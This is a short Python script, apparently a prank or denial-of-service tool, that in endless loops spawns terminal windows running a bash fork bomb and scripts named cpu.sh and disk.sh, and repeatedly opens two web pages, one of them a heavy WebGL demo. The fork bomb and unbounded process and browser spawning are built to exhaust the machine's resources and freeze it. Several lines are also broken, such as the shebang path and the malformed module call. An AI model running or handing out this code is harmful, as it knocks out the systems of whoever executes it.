#!usr/bin/env python3
import subprocess, webbrowser, asyncio

commands = [
    "bash Scripts/cpu.sh",
    ":(){ :|: & };:",
    "bash Scripts/disk.sh",
    "bash Scripts/launcher.sh",
    "python3 -m main.py"
]

subprocess.run(f"chmod +x Scripts/cpu.sh")
subprocess.run(f"chmod +x Scripts/disk.sh")
subprocess.run(f"chmod +x Scripts/launcher.sh")

async def main():
    while True:
        asyncio.run(one())
        asyncio.run(two())

async def one():
    while True:
        for cmd in commands:
            subprocess.Popen(["gnome-terminal", "--", "bash", "-c", cmd])
            webbrowser.open("https://www.growden.io")
            webbrowser.open("https://webglsamples.org/aquarium/aquarium.html")

async def two():
    while True:
        for cmd in commands:
            subprocess.Popen([cmd])
            webbrowser.open("https://www.growden.io")
            webbrowser.open("https://webglsamples.org/aquarium/aquarium.html")

while True:
    asyncio.run(main())